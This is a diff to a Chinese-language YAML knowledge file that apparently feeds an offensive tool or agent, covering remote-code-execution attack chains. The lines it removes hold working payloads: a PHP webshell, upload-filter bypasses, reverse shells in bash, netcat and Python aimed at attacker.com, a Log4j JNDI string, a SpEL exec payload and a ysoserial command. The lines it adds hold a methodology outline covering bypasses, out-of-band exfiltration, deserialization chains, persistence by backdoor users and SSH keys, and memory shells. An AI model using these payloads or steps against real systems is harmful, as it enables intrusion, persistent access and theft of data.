@@ -1,22 +1,108 @@
-name: 远程代码执行
-description: 命令注入、代码执行漏洞利用技术
+name: 远程代码执行攻击链
+description: RCE攻击思维链 - 文件上传、命令注入、反序列化、框架漏洞
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - rce
-- command-injection
-knowledge: "# RCE攻击链\n\n## 文件上传 → WebShell\n\n### 1. 基础上穿\n\n```\n1. 上传.php文件\n   Content-Disposition: form-data; name=\"\
-  file\"; filename=\"shell.php\"\n   <?php system($_GET['cmd']); ?>\n\n2. 绕过Content-Type\n   Content-Type: image/jpeg\n\n\
-  3. 访问Shell\n   http://target/uploads/shell.php?cmd=whoami\n```\n\n### 2. 图片马利用\n\n```bash\n# 生成图片马\ncopy 1.jpg /b + shell.php\
-  \ /b shell.jpg\n\n# 上传后包含\n?page=upload/shell.jpg\n```\n\n### 3. .htaccess利用\n\n```\n# 上传.htaccess\nAddType application/x-httpd-php\
-  \ .jpg\n<FilesMatch \"jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n\n# 上传shell.jpg\n```\n\n---\n\n## 命令注入\
-  \ → 反弹Shell\n\n### 1. 基础测试\n\n```\n; whoami\n| id\n& whoami\n```\n\n### 2. 反弹Shell\n\n```bash\n# Bash\nbash -i >& /dev/tcp/attacker.com/4444\
-  \ 0>&1\n\n# Netcat\nnc -e /bin/sh attacker.com 4444\n\n# Python\npython -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"\
-  attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"/bin/sh\",\"-i\"])'\n```\n\n### 3. 写入WebShell\n\
-  \n```\n; echo '<?php system($_GET[\"cmd\"]);?>' > /var/www/html/shell.php\n```\n\n---\n\n## 反序列化 → RCE\n\n### PHP反序列化\n\n\
-  ```\n# 生成Payload\nphp -r 'echo serialize(new User(\"admin\",\"cmd\"));'\n\n# 触发\n unserialize($_POST['data'])\n```\n\n###\
-  \ Java反序列化\n\n```\n# 使用ysoserial\njava -jar ysoserial.jar CommonsCollections1 \"command\" > payload.ser\n```\n\n---\n\n\
-  ## 框架漏洞 → RCE\n\n### Log4j\n\n```\n${jndi:ldap://attacker.com/Exploit}\n```\n\n### Spring SpEL\n\n```\n${T(java.lang.Runtime).getRuntime().exec('id')}\n\
-  ```\n\n---\n\n## 攻击链速查\n\n| 阶段 | 方法 | 关键步骤 |\n|------|------|----------|\n| 获取入口 | 文件上传/命令注入/反序列化 | 绕过过滤 |\n| 反弹Shell |\
-  \ Bash/Netcat/Python | 目标有出网能力 |\n| 写WebShell | 文件写入 | 获取路径 |\n"
+
+knowledge: |
+  # RCE攻击思维链
+
+  ```
+  入口点识别 → 文件上传/命令注入/反序列化/框架漏洞
+         ↓
+  获取执行 → WebShell/反弹连接/内存马
+         ↓
+  权限维持 → 定时任务/后门用户/SSH公钥
+  ```
+
+  ---
+
+  ## 文件上传
+
+  **绕过思路**:
+  | 防护 | 绕过方法 |
+  |------|----------|
+  | 后缀黑名单 | php5/phtml/phps/php7等变种 |
+  | Content-Type | 改为 image/jpeg |
+  | 文件头检测 | 添加GIF89a/PNG头 |
+  | 二次渲染 | 配合条件竞争 |
+  | 路径可控 | 00截断/上传.htaccess |
+
+  **关键技术**:
+  - 图片马: 合并图片和PHP代码
+  - .htaccess: 让jpg当php执行
+  - 条件竞争: 上传→快速访问→执行
+
+  ---
+
+  ## 命令注入
+
+  **连接符**: `;` `|` `||` `&` `&&` 换行符 反引号 `$()`
+
+  **无回显利用**:
+  - 反向连接: 使用bash/python/perl等
+  - DNS外带: 通过子域名带出数据
+  - HTTP外带: 通过请求带出数据
+
+  **绕过空格**: `$IFS` `${IFS}` 重定向符号
+
+  **绕过关键字**:
+  - 变量拼接
+  - 编码绕过(Base64/Hex)
+  - 通配符替代
+
+  ---
+
+  ## 反序列化RCE
+
+  ### PHP
+  - **魔术方法链**: `__destruct/__wakeup/__toString/__get`
+  - **Phar反序列化**: 通过file_exists等触发
+  - **原生类**: SoapClient(SSRF)/DirectoryIterator/SplFileObject
+
+  ### Java
+  - **工具**: ysoserial生成payload
+  - **常见链**: CommonsCollections/CommonsBeanutils/Spring
+  - **入口**: ObjectInputStream/JRMP
+
+  ### Python
+  - **Pickle**: `__reduce__`方法
+  - **绕过**: 黑名单模块替代
+
+  ---
+
+  ## 框架漏洞RCE
+
+  | 框架 | 漏洞 | 利用方式 |
+  |------|------|---------|
+  | Log4j | JNDI注入 | jndi:ldap协议 |
+  | Spring | SpEL | 表达式执行 |
+  | Fastjson | 反序列化 | JdbcRowSetImpl |
+  | Shiro | RememberMe | 反序列化链 |
+  | Struts2 | OGNL | OGNL表达式 |
+  | ThinkPHP | RCE | invokefunction |
+
+  ---
+
+  ## 反向连接方式
+
+  各语言都有对应的反向连接方法:
+  - Bash: 使用tcp重定向
+  - Python: socket + subprocess
+  - PHP: fsockopen + exec
+  - Perl: socket + open
+  - NC: -e参数或管道
+
+  **注意**: 目标需有出网能力
+
+  ---
+
+  ## 内存马
+
+  | 语言 | 类型 |
+  |------|------|
+  | PHP | 不死马(进程循环生成) |
+  | Java | Filter/Servlet/Valve |
+  | Spring | Controller内存马 |
